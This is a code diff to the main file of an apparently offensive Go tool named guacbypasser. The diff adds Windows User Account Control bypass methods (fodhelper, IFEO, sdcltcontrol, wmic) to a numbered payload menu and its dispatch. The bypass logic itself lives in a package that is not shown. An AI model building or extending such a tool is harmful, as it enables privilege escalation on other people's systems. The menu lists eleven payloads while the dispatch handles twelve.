@@ -5,7 +5,6 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
-	"syscall"
 
 	guacbypasser "./src"
 )
@@ -65,11 +64,15 @@ func main() {
 	  Payloads numbers:
 		1. computerdefaults.exe - bypass User Account Control via computerdefaults.exe  and registry modyfying
 		2. eventvwr.exe - bypass User Account Control via eventvwr.exe and registry modyfying
-		3. HKCU Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
-		4. HKLM Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
-		5. schtasks.exe - bypass User Account Control via schtasks.exe and XML auto-evelated
-		6. slui.exe - bypass User Account Control via slui.exe and registry modyfying
-		7. userinit.exe - bypass User Account Control via userinit.exe and registry modyfying
+		3. fodhelper.exe - bypass User Account Control via fodhelper.exe and registry modyfying
+		4. HKCU Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
+		5. HKLM Runer (OneDriveUpdate) - bypass User Account Control via registry modyfying
+		6. IFEO - bypass User Account Control via Image File Execution Options
+		7. schtasks.exe - bypass User Account Control via schtasks.exe and XML auto-evelated
+		8. sdcltcontrol.exe - bypass User Account Control via sdcltcontrol.exe and registry modyfying
+		9. slui.exe - bypass User Account Control via slui.exe and registry modyfying
+		10. userinit.exe - bypass User Account Control via userinit.exe and registry modyfying
+		11. wmic.exe - bypass User Account Control via wmic.exe and command executions
 			`)
 		} else if input == "author" {
 			fmt.Println(`
@@ -81,31 +84,7 @@ func main() {
 	  Current version - 1.1
 			`)
 		} else if input == "exit" {
-			var kernel32 syscall.Handle
-			kernel32, err = syscall.LoadLibrary("kernel32.dll")
-			if err != nil {
-				log.Fatal(err)
-			}
-			defer syscall.FreeLibrary(kernel32)
-
-			var proc32 uintptr
-			proc32, err = syscall.GetProcAddress(kernel32, "ExitProcess")
-			if err != nil {
-				log.Fatal(err)
-			}
-
-			_, _, err = syscall.Syscall(
-				uintptr(proc32),
-				1,
-				0,
-				0,
-				0,
-			)
-
-			if err != nil {
-				os.Exit(1)
-			}
-
+			guacbypasser.W32_Terminate()
 		} else if input == "payload=1" {
 			guacbypasser.HWND_W32_Method_Computerdefaults(
 				string(data),
@@ -115,27 +94,43 @@ func main() {
 				string(data),
 			)
 		} else if input == "payload=3" {
-			guacbypasser.HWND_W32_Method_HKCU_Runer(
+			guacbypasser.HWND_W32_Method_Fodhelper(
 				string(data),
 			)
 		} else if input == "payload=4" {
-			guacbypasser.HWND_W32_Method_HKLM_Runer(
+			guacbypasser.HWND_W32_Method_HKCU_Runer(
 				string(data),
 			)
 		} else if input == "payload=5" {
-			guacbypasser.HWND_W32_Method_Schtasks(
+			guacbypasser.HWND_W32_Method_HKLM_Runer(
 				string(data),
 			)
 		} else if input == "payload=6" {
-			guacbypasser.HWND_W32_Method_SilentCleanUp(
+			guacbypasser.HWND_W32_Method_Ifeo(
 				string(data),
 			)
 		} else if input == "payload=7" {
-			guacbypasser.HWND_W32_Method_Slui(
+			guacbypasser.HWND_W32_Method_Schtasks(
 				string(data),
 			)
 		} else if input == "payload=8" {
+			guacbypasser.HWND_W32_Method_Sdcltcontrol(
+				string(data),
+			)
+		} else if input == "payload=9" {
+			guacbypasser.HWND_W32_Method_SilentCleanUp(
+				string(data),
+			)
+		} else if input == "payload=10" {
+			guacbypasser.HWND_W32_Method_Slui(
+				string(data),
+			)
+		} else if input == "payload=11" {
 			guacbypasser.HWND_W32_Method_Userinit(
+				string(data),
+			)
+		} else if input == "payload=12" {
+			guacbypasser.HWND_W32_Method_WMIC(
 				string(data),
 			)
 		}
